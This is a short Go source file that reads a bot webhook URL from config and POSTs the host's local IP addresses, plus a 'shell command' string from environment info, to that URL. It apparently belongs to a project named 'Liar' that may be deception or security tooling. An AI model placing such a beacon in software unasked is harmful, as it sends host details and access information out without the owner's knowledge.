package webhook

import (
	// "fmt"
	"net/http"
	"strings" 
	"bytes" 
 
	"github.com/AloneSOC/Liar/config" 
 
)

func Webhook(){
	botURL, botJson := config.GetBot()
	localIPs := config.GetLocalIPsAsString()
	_, _, _, shellCommand := config.GetEnvInfo()
	
	botJson = strings.Replace(botJson, "{LOCALIPS}", localIPs, -1)
	botJson = strings.Replace(botJson, "{SHELLCOMMAND}", shellCommand, -1)

	// fmt.Println(botURL)
	// fmt.Println(botJson)

	resp, err := http.Post(botURL, "application/json", bytes.NewBuffer([]byte(botJson)))
	if err != nil {
		return
	}
	defer resp.Body.Close()

}




